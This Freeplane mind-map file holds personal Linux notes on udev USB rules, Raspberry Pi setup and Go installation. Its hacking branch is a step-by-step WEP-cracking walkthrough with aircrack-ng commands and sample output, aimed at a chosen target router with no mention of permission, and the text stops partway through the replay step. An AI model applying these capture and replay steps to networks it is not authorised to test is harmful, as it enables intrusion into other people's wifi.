<map version="freeplane 1.6.0">
<!--To view this file, download free mind mapping software Freeplane from http://freeplane.sourceforge.net -->
<node TEXT="Linux" FOLDED="false" ID="ID_1723255651" CREATED="1283093380553" MODIFIED="1466721553198"><hook NAME="MapStyle">
    <properties fit_to_viewport="false;" edgeColorConfiguration="#808080ff,#808080ff,#808080ff,#808080ff,#808080ff"/>

<map_styles>
<stylenode LOCALIZED_TEXT="styles.root_node" STYLE="oval" UNIFORM_SHAPE="true" VGAP_QUANTITY="24.0 pt">
<font SIZE="24"/>
<stylenode LOCALIZED_TEXT="styles.predefined" POSITION="right" STYLE="bubble">
<stylenode LOCALIZED_TEXT="default" MAX_WIDTH="600.0 px" COLOR="#000000" STYLE="as_parent">
<font NAME="SansSerif" SIZE="10" BOLD="false" ITALIC="false"/>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.details"/>
<stylenode LOCALIZED_TEXT="defaultstyle.attributes">
<font SIZE="9"/>
</stylenode>
<stylenode LOCALIZED_TEXT="defaultstyle.note"/>
<stylenode LOCALIZED_TEXT="defaultstyle.floating">
<edge STYLE="hide_edge"/>
<cloud COLOR="#f0f0f0" SHAPE="ROUND_RECT"/>
</stylenode>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.user-defined" POSITION="right" STYLE="bubble">
<stylenode LOCALIZED_TEXT="styles.topic" COLOR="#18898b" STYLE="fork">
<font NAME="Liberation Sans" SIZE="10" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.subtopic" COLOR="#cc3300" STYLE="fork">
<font NAME="Liberation Sans" SIZE="10" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.subsubtopic" COLOR="#669900">
<font NAME="Liberation Sans" SIZE="10" BOLD="true"/>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.important">
<icon BUILTIN="yes"/>
</stylenode>
</stylenode>
<stylenode LOCALIZED_TEXT="styles.AutomaticLayout" POSITION="right" STYLE="bubble">
<stylenode LOCALIZED_TEXT="AutomaticLayout.level.root" COLOR="#000000">
<font SIZE="18"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,1" COLOR="#0033ff">
<font SIZE="16"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,2" COLOR="#00b439">
<font SIZE="14"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,3" COLOR="#990000">
<font SIZE="12"/>
</stylenode>
<stylenode LOCALIZED_TEXT="AutomaticLayout.level,4" COLOR="#111111">
<font SIZE="10"/>
</stylenode>
</stylenode>
</stylenode>
</map_styles>
</hook>
<hook NAME="AutomaticEdgeColor" COUNTER="17" RULE="ON_BRANCH_CREATION"/>
<node TEXT="install usb rules * run when usb device plugged in" FOLDED="true" POSITION="right" ID="ID_1055470153" CREATED="1466721556288" MODIFIED="1466790270943" LINK="http://hackaday.com/2009/09/18/how-to-write-udev-rules/">
<edge COLOR="#ff0000"/>
<node TEXT="Install a script in /etc/udev/rules.d/&#xa;and give it a unique number and name, and make it executable&#xa;cd /etc/udev/rules.d&#xa;touch 53-unique.rules&#xa;chmod +x 53-unique.rules" ID="ID_1183689199" CREATED="1466721573000" MODIFIED="1466789057286"/>
<node TEXT="The script must match the usb system and device itself&#xa;SUBSYSTEM==&quot;usb&quot;, \&#xa;# match the idVendor and idProduct of device&#xa;ATTRS{idVendor}==&quot;0510&quot;, \&#xa;ATTRS{idProduct}==&quot;0032&quot;, \" ID="ID_1135460660" CREATED="1466789064719" MODIFIED="1466789221557"/>
<node TEXT="You can find id of product by running&#xa;lsusb  (LSUSB)&#xa;the info you want will appear as&#xa;vendor:product&#xa;&#xa;OR you can run&#xa;dmesg | tail&#xa;after plugging in device, and you should see device identified" ID="ID_128105094" CREATED="1466789222101" MODIFIED="1466789288765"/>
<node TEXT="To run a script, add this to udev rules&#xa;RUN+=&quot;/usr/bin/sudo -u &lt;user&gt; /home/&lt;user&gt;/bin/script.sh&quot;, \&#xa;# which switches out of root access into &lt;user&gt;, such as lance" ID="ID_134282820" CREATED="1466789289161" MODIFIED="1502399317691"/>
<node TEXT="and to enable it to run with all users (requiring no sudo permissions):&#xa;MODE=&quot;0666&quot;" ID="ID_819353445" CREATED="1466789338790" MODIFIED="1466789362726"/>
<node TEXT="Putting it all together (expand to see code)" FOLDED="true" ID="ID_1141046362" CREATED="1466789375810" MODIFIED="1466789391389">
<node TEXT="ACTION==&quot;add&quot;, \                                                               &#xa;SUBSYSTEM==&quot;usb&quot;, \                                                            &#xa;ATTRS{idVendor}==&quot;0510&quot;, \                                                     &#xa;ATTRS{idProduct}==&quot;0032&quot;, \                                                    &#xa;# switch out of root access into &lt;user&gt;, such as lance (for security)&#xa;RUN+=&quot;/usr/bin/sudo -u lance /home/lance/bin/dvorak-qwerty/enable_dvorak_on_usb_keyboard.sh&quot;, \&#xa;# to be extra sure, enable ALL users to access device                          &#xa;MODE=&quot;0666&quot;" ID="ID_1595767548" CREATED="1466789392637" MODIFIED="1502399196581"/>
</node>
<node TEXT="NOW... the script that must be run has two requirements.&#xa;1) it must jail itself by running the script as another user, NOT root&#xa;2) the script must background-recursive call itself the first time.&#xa;This can be done by echoing the filename and an argument (&quot;x&quot;) into &quot;at now&quot;. This spawns a new non-child execution instance so that it won&apos;t get shut down by the udev watchdog" ID="ID_122732975" CREATED="1466789461453" MODIFIED="1502399505996"/>
<node TEXT="The script looks like this: (expand to see code)" FOLDED="true" ID="ID_1723450603" CREATED="1466789606875" MODIFIED="1466790008700">
<node TEXT="Generalized" FOLDED="true" ID="ID_321760831" CREATED="1502398443244" MODIFIED="1502398445386">
<node TEXT="#! /bin/bash&#xa;# This script recursively backgrounds itself to&#xa;# avoid being shut down by a udev/rules.d watchdog&#xa;if [[ $# == 0 ]]&#xa;then&#xa;    # re-run program in background using &quot;at now&quot;&#xa;    # you&apos;ll want to verify you have &quot;at&quot; installed&#xa;    # you can&apos;t use &quot;&amp;&quot; because the watchdog still cuts it short&#xa;    # argument &quot;x&quot; is passed, which skips this section in the next run&#xa;    echo $0 &quot;x&quot; | at now&#xa;    # exit. Newly spawned recursive instance using &quot;at now&quot; will continue running&#xa;    exit 0&#xa;    echo &quot;IF THIS TEXT APPEARS, SCRIPT IS MALFUNCTIONING&quot;&#xa;fi&#xa;echo &quot;put your commands to run below here&quot;" ID="ID_299718042" CREATED="1466789655468" MODIFIED="1502399078649"/>
</node>
<node TEXT="Specific example" FOLDED="true" ID="ID_1475301461" CREATED="1502398448620" MODIFIED="1502398453666">
<node TEXT="#! /bin/bash&#xa;# this script is run when the keyboard is plugged in, and it switches the&#xa;# keyboard layout to dvorak. This script is called by a script that executes in&#xa;# /etc/udev/rules.d&#xa;# You can see the rules.d script as a commented-out block at end of this file&#xa;&#xa;# scripts called by /etc/udev/rules.d/* MUST call an intermediate script that&#xa;# backgrounds the actual task. This script recursively backgrounds itself to&#xa;# avoid being shut down by a udev/rules.d watchdog&#xa;if [[ $# == 0 ]]&#xa;then&#xa;    # re-run program in background using &quot;at now&quot;&#xa;    # you&apos;ll want to verify you have &quot;at&quot; installed&#xa;    # you can&apos;t use &quot;&amp;&quot; because the watchdog still cuts it short&#xa;    # argument &quot;x&quot; is passed, which skips this section in the next run&#xa;    echo $0 &quot;x&quot; | at now&#xa;    # exit so that this process does not continue running&#xa;    exit 0&#xa;fi&#xa;&#xa;# exporting of display somehow makes this work.&#xa;DISPLAY=&quot;:0.0&quot;&#xa;DVQP_KEYBOARD_ENABLED=1&#xa;export DISPLAY DVQP_KEYBOARD_ENABLED&#xa;&#xa;# MULTIPLE TIMES set keyboard to dvorak. (because it resets ~.2 seconds in)&#xa;layout=&quot;-layout pc+us+usdvq -variant dvqp -option caps:escape&quot;&#xa;i=&quot;5&quot;&#xa;while [ $i -gt 0 ]&#xa;do&#xa;    let i-=1&#xa;    # find ID of usb keyboard&#xa;    keyboards=`xinput -list | grep &quot;USB .*Keyboard&quot;`&#xa;    usbkbd_id=`echo $keyboards | awk -F&apos;=&apos; &apos;{print $2}&apos; | cut -c 1-2 | head -1`&#xa;    if [ &quot;${usbkbd_id}&quot; ]; then&#xa;        # set keyboard layout here. I also change capslock to escape&#xa;        setxkbmap -device &quot;${usbkbd_id}&quot; $layout&#xa;    fi&#xa;    sleep 0.3&#xa;done&#xa;exit 0" ID="ID_36687184" CREATED="1502398788190" MODIFIED="1502398912291"/>
<node TEXT="# you can see your current layout by running&#xa;# setxkbmap -print -verbose 10&#xa;#Trying to load rules file /usr/share/X11/xkb/rules/evdev...&#xa;#Success.&#xa;#Applied rules from evdev:&#xa;#rules:      evdev&#xa;#model:      pc104&#xa;#layout:     us&#xa;#Trying to build keymap using the following components:&#xa;#keycodes:   evdev+aliases(qwerty)&#xa;#types:      complete&#xa;#compat:     complete&#xa;#symbols:    pc+us+inet(evdev)&#xa;#geometry:   pc(pc104)&#xa;#xkb_keymap {&#xa;#        xkb_keycodes  { include &quot;evdev+aliases(qwerty)&quot; };&#xa;#        xkb_types     { include &quot;complete&quot;      };&#xa;#        xkb_compat    { include &quot;complete&quot;      };&#xa;#        xkb_symbols   { include &quot;pc+us+inet(evdev)&quot;     };&#xa;#        xkb_geometry  { include &quot;pc(pc104)&quot;     };&#xa;#};" ID="ID_150375111" CREATED="1502398816341" MODIFIED="1502398817273"/>
<node TEXT="# BELOW HERE IS THE /etc/udev/rules.d script that runs this script&#xa;# http://ubuntuforums.org/archive/index.php/t-502864.html&#xa;# you can find the idVendor / Product by running dmesg | tail OR lsusb&#xa;ACTION==&quot;add&quot;, \&#xa;SUBSYSTEM==&quot;usb&quot;, \&#xa;ATTRS{idVendor}==&quot;0510&quot;, \&#xa;ATTRS{idProduct}==&quot;0032&quot;, \&#xa;# switch out of root access into &lt;user&gt;, such as lance&#xa;RUN+=&quot;/usr/bin/sudo -u lance /home/lance/bin/dvorak-qwerty/enable_dvorak_on_usb_keyboard.sh&quot;, \&#xa;# to be extra sure, enable ALL users to access device&#xa;MODE=&quot;0666&quot;" ID="ID_1048830391" CREATED="1502398807974" MODIFIED="1502398808815"/>
</node>
</node>
</node>
<node TEXT="Connect wifi from the command-line" FOLDED="true" POSITION="right" ID="ID_560614402" CREATED="1504198249759" MODIFIED="1504198268244">
<edge COLOR="#808080"/>
<node TEXT="Connect to an unsecured wifi network" FOLDED="true" ID="ID_670119651" CREATED="1504198274796" MODIFIED="1504198472522" LINK="https://www.raspberrypi.org/forums/viewtopic.php?t=50398">
<node TEXT="Edit the /etc/network/interfaces file" ID="ID_196724382" CREATED="1504198298341" MODIFIED="1504198308434"/>
<node TEXT="auto lo&#xa;&#xa;iface lo inet loopback&#xa;iface eth0 inet dhcp&#xa;&#xa;allow-hotplug wlan0&#xa;iface wlan0 inet dhcp&#xa;wireless-essid Your-Network-Name" ID="ID_266461247" CREATED="1504198309482" MODIFIED="1504198331884"/>
<node TEXT="Since the rasbperry pi 3 seems to have a wlan0 as well as wlan1, I also added" ID="ID_1489280430" CREATED="1504198332495" MODIFIED="1504198403034"/>
<node TEXT="allow-hotplug wlan1&#xa;iface wlan1 inet dhcp&#xa;wireless-essid theintertubes" ID="ID_1656110273" CREATED="1504198351987" MODIFIED="1504198374075"/>
<node TEXT="(with the more specific essid already filled in)&#xa;Then reboot and it should work!" ID="ID_284974234" CREATED="1504198406610" MODIFIED="1504198424607"/>
</node>
</node>
<node TEXT="Enable serial-console connection on raspi" FOLDED="true" POSITION="right" ID="ID_660374226" CREATED="1504198501893" MODIFIED="1504198518567">
<edge COLOR="#808080"/>
<node TEXT="You&apos;ll have to remove the SD card and mount it in another computer.&#xa;Find the boot partition and edit the config.txt file&#xa;Somewhere down the bottom add these lines:" ID="ID_1063909968" CREATED="1504198522763" MODIFIED="1504198558975"/>
<node TEXT="# this enables console access from the serial port on the raspi&#xa;enable_uart=1" ID="ID_603681660" CREATED="1504198559525" MODIFIED="1504198594271"/>
<node TEXT="After that, save, unmount, remove card, re-insert, restart pi.&#xa;you&apos;ll need to look up the gpio pinout to see which pins to connect.&#xa;In general, it goes RED, (blank), BLACK, WHITE, GREEN on a specific set of the pins.&#xa;Again, PLEASE LOOK THIS UP ONLINE" ID="ID_578779986" CREATED="1504198596088" MODIFIED="1504198910442" LINK="https://learn.adafruit.com/adafruits-raspberry-pi-lesson-5-using-a-console-cable/connect-the-lead"/>
<node TEXT="DO NOT USE THE RED PIN UNLESS YOU ARE POWERING THE PI THROUGH USB.&#xa;If it&apos;s already powered, don&apos;t connect the power / red pin" ID="ID_54056486" CREATED="1504198715896" MODIFIED="1504198742769"/>
</node>
<node TEXT="Install golang on raspberry pi" FOLDED="true" POSITION="right" ID="ID_1548490202" CREATED="1504199523807" MODIFIED="1504199538271" LINK="https://gist.github.com/konradko/a9468beb70f0fa47766f5ebf966f24e8">
<edge COLOR="#808080"/>
<node TEXT="I also had to install git" FOLDED="true" ID="ID_1261017995" CREATED="1504214320931" MODIFIED="1504214325195">
<node TEXT="Which meant I had to&#xa;sudo apt-get update&#xa;sudo apt-get install git" ID="ID_640476249" CREATED="1504214327450" MODIFIED="1504214340892"/>
</node>
</node>
<node TEXT="Resize serial console terminal on raspberry pi" FOLDED="true" POSITION="right" ID="ID_1069069356" CREATED="1504371309485" MODIFIED="1504371328082" LINK="http://shallowsky.com/blog/hardware/serial-24-line-terminals.html">
<edge COLOR="#808080"/>
<node TEXT="I often have Vim resize itself (not by my command) to some incredibly small 80x24 window.&#xa;This apparently is the pi&apos;s fault. So I found a script that resets it for you, based on how large your actual terminal is." ID="ID_1173784651" CREATED="1504371337569" MODIFIED="1504371482629"/>
<node TEXT="To get it to run when you login, you must put the script in ~/.bash_profile" ID="ID_1013158687" CREATED="1504371483120" MODIFIED="1504371509753"/>
<node TEXT="# I run it twice; once with python2.7, then with python3&#xa;python termsize.py&#xa;python3 termsize.py" ID="ID_1019287925" CREATED="1504371572200" MODIFIED="1504371596288"/>
</node>
<node TEXT="pentesting / security / hacking" FOLDED="true" POSITION="right" ID="ID_103179649" CREATED="1505491788753" MODIFIED="1505491794299">
<edge COLOR="#808080"/>
<node TEXT="Wireless hacking" FOLDED="true" ID="ID_717244588" CREATED="1505491796698" MODIFIED="1505491971731" LINK="http://www.wirelesshack.org/step-by-step-kali-linux-and-wireless-hacking-basics-wep-hacking-part-3.html">
<node TEXT="In general you&apos;ll need to install the aircrack-ng package. That&apos;ll install airmon-ng, airodump-ng, and aireplay-ng" ID="ID_1012687738" CREATED="1505491894520" MODIFIED="1505491918289"/>
<node TEXT="Wireless hacking (cracking) requires watching traffic often enough to compute the security hash. So in general this means you&apos;ll need a wireless card that can be put in observe mode&#xa;(and also -- probably need injection capabilities)" ID="ID_532033842" CREATED="1505491931338" MODIFIED="1505492096411"/>
<node TEXT="WEP cracking" FOLDED="true" ID="ID_1352460230" CREATED="1505492192274" MODIFIED="1505492199868">
<node FOLDED="true" ID="ID_237073790" CREATED="1505492201067" MODIFIED="1505493867973"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Put your wifi card into monitor mode:
    </p>
    <p>
      <b>airmon-ng start wlp9s0</b>
    </p>
    <p>
      where wlps9 is the name of my wifi card
    </p>
  </body>
</html>
</richcontent>
<node TEXT="This places the card into monitor mode, and the script will tell you it&apos;s new name. Typicallly it will be called mon0 (aka monitor0)" ID="ID_1581638143" CREATED="1505493297658" MODIFIED="1505493328441"/>
<node TEXT="You&apos;ll need to find the name of your wireless card, so run&#xa;ifconfig ??" ID="ID_448402206" CREATED="1505492232864" MODIFIED="1505493279817"/>
<node TEXT="Found 2 processes that could cause trouble.&#xa;If airodump-ng, aireplay-ng or airtun-ng stops working after&#xa;a short period of time, you may want to kill (some of) them!&#xa;&#xa;PID     Name&#xa;3785    avahi-daemon&#xa;3788    avahi-daemon&#xa;&#xa;&#xa;Interface       Chipset         Driver&#xa;&#xa;wlp9s0          Unknown         rtl8192se - [phy0]&#xa;                                (monitor mode enabled on mon0)&#xa;wls4            Broadcom        wl - [phy1]" ID="ID_123220482" CREATED="1505493614301" MODIFIED="1505493646062">
<font BOLD="true" ITALIC="true"/>
</node>
</node>
<node TEXT="The script will probably also list some services that are running that will likely intervene to reconnect to the internet. You may have to kill these processes to reliably proceed" FOLDED="true" ID="ID_1398535415" CREATED="1505493416868" MODIFIED="1505493451559">
<node TEXT="sudo killall NetworkManager&#xa;sudo killall dhcpcd&#xa;sudo killall wpa_supplicant&#xa;sudo killall dhclient&#xa;sudo service avahi-daemon stop" ID="ID_360914861" CREATED="1505493455797" MODIFIED="1505493658159">
<font BOLD="true" ITALIC="true"/>
</node>
</node>
<node FOLDED="true" ID="ID_354419134" CREATED="1505493363180" MODIFIED="1505493965736"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      now monitor the current traffic to identify the router you wish to hack. Using a cell phone or tablet with a wifi-monitoring tool is also very acceptable here. But it's best to use your laptop to verify the wireless card is working. You should see traffic from nearly all channels.
    </p>
    <p>
      If you only see traffic from a couple channels, you may still be connected to the internet
    </p>
    <p>
      <b>airodump-ng mon0 </b>
    </p>
    <p>
      you can also filter by channel 11 with --channel 11
    </p>
  </body>
</html>
</richcontent>
<node TEXT="sudo airodump-ng --channel 11 mon0                            &#xa;&#xa; CH 11 ][ Elapsed: 16 s ][ 2017-09-14 19:53 ][ fixed channel mon0: -1                          &#xa;                                                                                               &#xa; BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&#xa;                                                                                               &#xa; 02:AA:FE:BB:CA:40   -1   0      145      551   48   1  54   WPA2 CCMP   PSK  &lt;length:  0&gt;     &#xa; A0:AA:B7:BB:87:B2  -40  74      120        0    0   2  54 . WPA2 CCMP   PSK  PEU-B            &#xa; 00:AA:15:BB:30:71  -57  40       77        0    0   1  54e  WEP  WEP         Xcelerator       &#xa; A0:AA:91:BB:D5:EE  -75  13       33        0    0   1  54e. WPA2 CCMP   PSK  NETGEAR06          &#xa; 00:AA:8C:BB:A6:E0  -79  11       26        0    0   1  54e. WPA2 CCMP   PSK  Tek                &#xa; 80:AA:73:BB:9C:E0  -85   0        0        2    0   1  54e. WPA2 CCMP   PSK  Frontier3968      &#xa;                                                                                                &#xa; BSSID              STATION            PWR   Rate    Lost    Frames  Probe                      &#xa;                                                                                                &#xa; (not associated)   A4:AA:33:BB:EF:56  -77    0 - 1      0        1                             &#xa; (not associated)   AC:AA:12:BB:56:AA  -71    0 - 1      0        1                             &#xa; (not associated)   D0:AA:35:BB:3A:95  -41    0 - 1      0        3                                 &#xa; (not associated)   A0:AA:36:BB:80:48  -49    0 - 1      0        2                             &#xa; (not associated)   E4:AA:01:BB:5C:E4  -51    0 - 1      0        9                             &#xa; (not associated)   9C:AA:54:BB:D7:00  -53    0 - 1      0       30  Kyak                       &#xa; (not associated)   58:AA:56:BB:8A:DD  -53    0 - 1      0        1                             &#xa; (not associated)   60:AA:89:BB:B0:AE  -65    0 - 1      0        2" ID="ID_1581833797" CREATED="1505493684580" MODIFIED="1505493839573">
<font BOLD="false" ITALIC="true"/>
</node>
</node>
<node FOLDED="true" ID="ID_223847746" CREATED="1505493881420" MODIFIED="1505494886575"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Once you know the BSSID (MAC ADDRESS) and ESSID and channel of the router / network you wish to crack, begin monitoring it (And saving packets)
    </p>
    <p>
      <b>sudo airodump-ng -w PEUx4 -c 11 --bssid 94:AA:52:BB:77:04 mon0 </b>
    </p>
    <p>
      which follows the format:
    </p>
    <p>
      airodump-ng -w &lt;filename / essid&gt; -c &lt;channel&gt; --bssid &lt;MAC address&gt; &lt;monitor interface&gt;
    </p>
    <p>
      The dump of traffic will be dumped to PEUx4-01.cap or something &quot;&lt;essid&gt;-01.cap&quot; similar
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1744887469" CREATED="1505494154987" MODIFIED="1505494240231"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <i>CH 11 ][ Elapsed: 4 mins ][ 2017-09-14 19:38&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;BSSID&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PWR RXQ&#160;&#160;<b>Beacons</b>&#160;&#160;&#160;&#160;<b>#Data</b>, #/s&#160;&#160;CH&#160;&#160;MB&#160;&#160;&#160;ENC&#160;&#160;CIPHER AUTH ESSID </i>
    </p>
    <p>
      <i>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;94:AA:52:BB:77:04&#160;&#160;-44&#160;&#160;&#160;0&#160;&#160;&#160;&#160;&#160;<b>2732&#160;&#160;&#160;&#160;46213</b>&#160;&#160;195&#160;&#160;11&#160;&#160;54e&#160;&#160;WEP&#160;&#160;WEP&#160; &#160;&#160;OPN&#160;&#160;PEU-A&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;BSSID&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;STATION&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PWR&#160;&#160;&#160;Rate&#160;&#160;&#160;&#160;Lost&#160;&#160;&#160;&#160;Frames&#160; Probe&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;94:44:52:94:77:04&#160;&#160;00:AA:CA:BB:09:86&#160;&#160;&#160;&#160;0&#160;&#160;&#160;24 - 1&#160;&#160;&#160;111978&#160;&#160;&#160;&#160;42451&#160; PEU-A&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;&#160;4:44:52:94:77:04&#160;&#160;D0:AA:35:BB:3A:95&#160;&#160;-35&#160;&#160;&#160;36e- 2e&#160;&#160;&#160;&#160;&#160;0&#160;&#160;&#160;&#160;&#160;&#160;560&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;94:44:52:94:77:04&#160;&#160;7C:AA:90:BB:C3:00&#160;&#160;-31&#160;&#160;&#160;&#160;1e- 1&#160;&#160;&#160;&#160;&#160;&#160;0&#160;&#160;&#160;&#160;&#160;&#160;871&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;94:44:52:94:77:04&#160;&#160;78:AA:43:BB:CA:C0&#160;&#160;-33&#160;&#160;&#160;54e-54e&#160;&#160;4714&#160;&#160;&#160;&#160;17503&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;94:44:52:94:77:04&#160;&#160;D0:AA:35:BB:3A:95&#160;&#160;-35&#160;&#160;&#160;54e- 2e&#160;&#160;&#160;&#160;&#160;0&#160;&#160;&#160;&#160;&#160;&#160;580&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;94:44:52:94:77:04&#160;&#160;44:AA:6C:BB:C4:70&#160;&#160;-37&#160;&#160;&#160;54e-18e&#160;&#160;1210&#160;&#160;&#160;&#160;&#160;&#160;677&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;94:44:52:94:77:04&#160;&#160;74:AA:0B:BB:26:F2&#160;&#160;-45&#160;&#160;&#160;54e- 1e&#160;&#160;&#160;&#160;&#160;0&#160;&#160;&#160;&#160;&#160;9123&#160;&#160;&#160; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </i>
    </p>
    <p>
      <i>&#160;94:44:52:94:77:04&#160;&#160;00:AA:E0:BB:1A:6D&#160;&#160;-57&#160;&#160;&#160;54e-54&#160;&#160;&#160;&#160;&#160;&#160;0&#160;&#160;&#160;&#160;&#160;2883</i>
    </p>
  </body>
</html>
</richcontent>
</node>
<node TEXT="The real stuff you&apos;re interested in is Beacons and #Data. Data in particular. You need to catch ~20k - 40k of data" ID="ID_1652751465" CREATED="1505494244389" MODIFIED="1505494270297"/>
<node ID="ID_908657726" CREATED="1505494499748" MODIFIED="1505494583245"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      <b>IF YOU DO NOT SEE ANY ROW UNDERNEATH BEACONDS / DATA, then you're wireless card isn't working. Try everything again. I struggled with my card multiple times until I finally got it to begin working (and it might've stopped working after I ran an aireplay-ng command)</b>
    </p>
  </body>
</html>
</richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_366062109" CREATED="1505494407895" MODIFIED="1505495159365"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      To increase the data and beacons that you collect, you'll probably need to spoof some traffic to get the router to reply. This is where aireplay-ng comes into effect. It'll be used to replay legitamate traffic back to the router so that the router replies and generates more unique traffic.
    </p>
    <p>
      So first you'll need to find a host communicating with your router.
    </p>
    <p>
      Look at the script currently capturing all data from that router.
    </p>
    <p>
      (the one running airodump-ng ........ mon0)
    </p>
    <p>
      It shows two things: 1) the router in question and amount of info gathered
    </p>
    <p>
